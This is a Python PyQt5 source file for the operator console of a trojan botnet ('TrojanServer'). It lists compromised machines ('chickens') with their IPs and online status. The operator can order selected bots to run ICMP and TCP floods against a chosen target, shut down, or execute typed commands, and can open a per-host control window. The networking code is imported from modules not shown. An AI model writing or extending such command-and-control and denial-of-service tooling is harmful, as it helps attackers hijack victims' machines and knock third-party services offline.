import builtins
import sys

from PyQt5.QtCore import pyqtSignal, QObject, Qt
from PyQt5.QtGui import QCursor
from PyQt5.QtWidgets import QMenu, QWidget, QApplication, QListWidgetItem, QAction, QCheckBox, QLabel

from control_panel import DetailMain

STDprint = builtins.print

from ServerUI import Ui_Server
from server import TrojanServer, Chienken


class Conmunication(QObject):
    chickenUpSignal = pyqtSignal(Chienken)
    selectChangeSignal = pyqtSignal(str)
    listFreshSignal = pyqtSignal(int, Chienken)
    refreshSignal = pyqtSignal()

class ServerMain(QWidget, Ui_Server):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        builtins.print = self.displayLog
        self.trojanServer = TrojanServer()
        self.signals = Conmunication()
        self.trojanServer.signals = self.signals
        self.signals.chickenUpSignal.connect(self.addToCurrentList)
        self.freshCurrentList()
        self.ipInput.setText(self.trojanServer.bind_IP)
        self.usp.setText(str(self.trojanServer.udpPort))
        self.urp.setText(str(self.trojanServer.udpRecvPort))
        self.tp.setText(str(self.trojanServer.tcpPort))
        self.bind()
        print("Welcome!")


    def bind(self):
        self.cmdEdit.returnPressed.connect(self.sendCmd)
        self.signals.selectChangeSignal.connect(self.changeSelected)
        self.freshlist.clicked.connect(self.freshCurrentList)
        self.scanAll.clicked.connect(self.trojanServer.scanAll)
        self.signals.listFreshSignal.connect(self.freshItem)
        self.saveButton.clicked.connect(self.save)
        self.chickenlist.setContextMenuPolicy(Qt.CustomContextMenu)
        self.chickenlist.customContextMenuRequested.connect(self.myListWidgetContext)
        self.all_button.clicked.connect(self.checkall)
        self.reverse_button.clicked.connect(self.reverseCheck)
        self.icmpButton.clicked.connect(self.icmp)
        self.signals.refreshSignal.connect(self.freshlist.clicked.emit)
        self.deletebutton.clicked.connect(self.deleteSelected)
        self.shutdownButton.clicked.connect(self.shutChicken)
        self.stopbutton.clicked.connect(lambda :self.opeate("floodStop"))
        self.tcpfloodbutton.clicked.connect(self.tcpFlood)

    def deleteSelected(self):
        selected = self.getSelect()
        for i in reversed(selected):
            self.trojanServer.cmdQ.put("delete %d"%i)
        # for c in selected:
        #     self.trojanServer.cmdQ.put("msg " + str(c) + " %s" % type)

    def icmp(self):
        self.opeate("icmpFlood %s" % self.attack_ip.text())

    def tcpFlood(self):
        self.opeate("tcpFlood %s %s" % (self.attack_ip.text(), self.attack_port.text()))

    def shutChicken(self):
        self.opeate(r"shutdown \s")

    def opeate(self, type):
        selected = self.getSelect()
        for c in selected:
            self.trojanServer.cmdQ.put("msg "+str(c)+" %s" % type)

    def freshItem(self, index, chicken):
        check:QCheckBox = self.chickenlist.itemWidget(self.chickenlist.item(index))
        check.setText("[%d][%s] %s\tip:%s\tport:%d "%(index,"在线" if chicken.online else "离线", chicken.name, chicken.ip, chicken.port))

    def myListWidgetContext(self, point):
        item = self.chickenlist.itemAt(point)
        if not item:
            return
        checkbox:QCheckBox = self.chickenlist.itemWidget(item)
        row = int(checkbox.text().split(']')[0][1:])
        popMenu = QMenu()

        a1 = QAction(u'连接', self)
        a2 = QAction(u'删除', self)

        popMenu.addAction(a1)
        popMenu.addAction(a2)

        a1.triggered.connect(lambda :self.openDetail(row))
        a2.triggered.connect(lambda :self.trojanServer.cmdQ.put("delete %d"%row))

        popMenu.exec_(QCursor.pos())

    def openDetail(self, row):
        print("control %d" %row)
        detail = DetailMain(self.trojanServer, row)
        detail.show()
        detail.connect_button.clicked.emit()

    def save(self):
        self.trojanServer.cmdQ.put("save")

    def sendCmd(self):
        cmd = self.cmdEdit.text()
        self.cmdEdit.clear()
        if cmd == "cls" or cmd == 'clear':
            self.logbrow.clear()
            return
        self.trojanServer.cmdQ.put(cmd)

    def changeSelected(self, name):
        # self.selectedLabel.setText(name)
        pass

    def displayLog(self, content, end='\n'):
        self.logbrow.append(str(content))
        self.logbrow.moveCursor(self.logbrow.textCursor().End)

    def freshCurrentList(self):
        i:int = 0
        online = self.online_check.isChecked()
        offline = self.offline_check.isChecked()
        self.chickenlist.clear()
        for chicken in self.trojanServer.allChickens:
            if (chicken.online and online) or (not chicken.online and offline):
                box = QCheckBox("[%d][%s] %s\tip:%s\tport:%d "%(i,"在线" if chicken.online else "离线", chicken.name, chicken.ip, chicken.port))
                item = QListWidgetItem()
                self.chickenlist.addItem(item)
                self.chickenlist.setItemWidget(item, box)
                box.clicked.connect(self.chickenChecked)
            i += 1

    def chickenChecked(self):
        sender = self.sender()
        print("check "+sender.text().split(']')[0][1:])


    def addToCurrentList(self, chicken:Chienken):
        self.freshCurrentList()

    def getSelect(self):
        count = self.chickenlist.count()
        res = []
        for i in range(0, count):
            box: QCheckBox = self.chickenlist.itemWidget(self.chickenlist.item(i))
            if box.isChecked():
                res.append(i)
        return res

    def checkall(self):
        count = self.chickenlist.count()
        for i in range(0, count):
            box:QCheckBox = self.chickenlist.itemWidget(self.chickenlist.item(i))
            box.setChecked(True)


    def reverseCheck(self):
        count = self.chickenlist.count()
        for i in range(0, count):
            box: QCheckBox = self.chickenlist.itemWidget(self.chickenlist.item(i))
            box.setChecked(not box.isChecked())

    def clearCheck(self):
        count = self.chickenlist.count()
        for i in range(0, count):
            box: QCheckBox = self.chickenlist.itemWidget(self.chickenlist.item(i))
            box.setChecked(False)

    def closeEvent(self, event):
        self.save()




if __name__ == '__main__':
    app = QApplication(sys.argv)
    MainWin = ServerMain()
    MainWin.show()
    sys.exit(app.exec_())


